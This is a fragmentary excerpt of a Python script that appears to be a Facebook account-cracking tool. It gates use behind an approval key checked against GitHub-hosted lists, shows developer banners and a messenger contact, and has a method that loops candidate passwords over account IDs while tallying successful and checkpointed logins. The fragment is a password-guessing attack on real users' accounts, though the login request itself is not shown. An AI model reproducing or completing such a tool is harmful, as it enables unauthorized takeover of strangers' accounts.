...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://raw.githubusercontent.com/kakon000999bd/aproval.txt/main/aprooval.txt"])
...
def notice():
	...
	runtxt("\033[0;93m FOR FREE APPROVAL SEND THIS KEY TO ADMIN >> %s%s"%(G,basesplit+'= LEGEND'))
	runtxt("\033[0;92m BYPASS ADMIN MESSENGER >> https://www.facebook.com/C4LL.M3.D3V1L")
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://github.com/C4LLM3D3V1L/approval/blob/main/Fuck.txt').text
			if basesplit in plr:
				key = basesplit
...
\033[1;97m••••••••••••••••••••••••••••••••••••••••••••••••••••••••
     \033[1;92m➣ \033[1;92mDEVOLPER   :            ADNAN ADIF HISHAM
     \033[1;91m➣ \033[1;92mFACEBOOK   :            ADNAN ADIF HISHAM
     \033[1;93m➣ \033[1;92mWHATSAPP   :            DIMU NA AMR ICCHA
     \033[1;96m➣ \033[1;92mGITHUB     :            C4LLM3D3V1L
...
\033[1;97m••••••••••••••••••••••••••••••••••••••••••••••••••••••••
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [LEGEND] : %s/%s -> \033[0;92m [ LEGEND-OK:%s ]- \033[0;91m[LEGEND-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
